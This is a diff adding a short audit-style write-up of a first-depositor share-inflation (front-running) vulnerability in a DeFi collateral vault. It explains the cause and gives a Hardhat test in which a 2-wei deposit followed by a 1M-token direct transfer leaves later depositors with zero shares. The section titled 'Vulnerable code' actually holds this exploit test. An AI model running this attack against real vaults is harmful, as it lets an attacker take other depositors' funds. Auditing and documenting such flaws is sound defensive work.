@@ -1,0 +1,24 @@
+Type of vulnerability: Initial Value Manipulation (Front-running)
+Cause of vulnerability: The first depositor can manipulate the share price by making a small initial deposit and then transferring a large amount of assets to inflate the share price, preventing subsequent depositors from receiving shares.
+Execution process: 
+1. Attacker deposits a small amount (2 wei) to mint 1 share.
+2. Attacker transfers a large amount (1M tokens) to the strategy controller to inflate the share price.
+3. Subsequent depositors, attempting to deposit reasonable amounts, receive 0 shares due to the inflated share price.
+Vulnerable code: 
+```solidity
+it("will cause 0 share issuance", async () => {
+    // 1. first user deposits 2 wei because 1 wei will be deducted for fee
+    let firstDepositAmount = ethers.BigNumber.from(2);
+    await transferAndApproveForDeposit(user, collateral.address, firstDepositAmount);
+    await collateral.connect(user).deposit(firstDepositAmount);
+    // 2. do huge transfer of 1M to strategy to controller
+    // to greatly inflate share price
+    await baseToken.transfer(strategyController.address, ethers.utils.parseEther("1000000"));
+    // 3. deployer tries to deposit reasonable amount of 10_000
+    let subsequentDepositAmount = ethers.utils.parseEther("10000");
+    await transferAndApproveForDeposit(deployer, collateral.address, subsequentDepositAmount);
+    await collateral.connect(deployer).deposit(subsequentDepositAmount);
+    // receives 0 shares in return
+    expect(await collateral.balanceOf(deployer.address)).to.be.eq(0);
+});
+```
